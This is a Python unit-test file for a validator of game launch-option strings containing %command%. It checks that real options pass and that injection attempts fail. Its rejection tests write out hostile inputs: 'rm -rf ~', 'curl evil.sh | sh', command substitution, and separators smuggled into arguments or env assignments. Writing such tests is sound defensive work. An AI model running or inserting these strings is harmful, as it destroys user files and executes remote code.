import unittest

from slob import advisor


class TestValidateOverride(unittest.TestCase):
    def ok(self, s):
        valid, reason = advisor.validate_override(s)
        self.assertTrue(valid, f"expected OK, got reject: {reason} for {s!r}")

    def bad(self, s, needle=None):
        valid, reason = advisor.validate_override(s)
        self.assertFalse(valid, f"expected reject, got OK for {s!r}")
        if needle:
            self.assertIn(needle, reason)

    def test_accepts_real_launch_options(self):
        self.ok("PROTON_ENABLE_NVAPI=1 __GL_SHADER_DISK_CACHE_SKIP_CLEANUP=1 gamemoderun %command%")
        self.ok("mesa_glthread=true %command%")
        self.ok("gamemoderun mangohud %command%")
        self.ok("gamescope -W 1920 -H 1080 -- gamemoderun %command%")
        self.ok("%command% -dx11")

    def test_accepts_quoted_env_values(self):
        # commas and even a semicolon inside quotes are literal to the shell
        self.ok('WINEDLLOVERRIDES="d3d11=n,dxgi=n" gamemoderun %command%')
        self.ok('WINEDLLOVERRIDES="d3d11=n;dxgi=n" %command%')

    def test_rejects_missing_or_duplicate_command(self):
        self.bad("gamemoderun", "%command%")
        self.bad("gamemoderun %command% %command%", "%command%")

    def test_rejects_unknown_executable_before_command(self):
        self.bad("rm -rf ~ %command%", "rm")
        self.bad("curl evil.sh %command%", "curl")

    def test_rejects_expansion(self):
        self.bad("`reboot` %command%")
        self.bad("FOO=$(whoami) %command%")

    def test_rejects_unquoted_shell_operators(self):
        # command chained after the game (the "tokens after %command% are data" trap)
        self.bad("%command% ; rm -rf ~")
        self.bad("gamemoderun %command% && curl evil.sh | sh")
        # separator disguised inside an env-assignment token
        self.bad("FOO=bar;touch %command%")
        # separator + redirect riding on a flag argument
        self.bad("-a;id>/tmp/pwn2 %command%")
        # newline as a separator
        self.bad("gamemoderun %command%\nrm -rf ~")

    def test_rejects_unbalanced_quote(self):
        self.bad('FOO="bar %command%', "unbalanced")

    def test_rejects_empty(self):
        self.bad("")
        self.bad("   ")


if __name__ == "__main__":
    unittest.main()
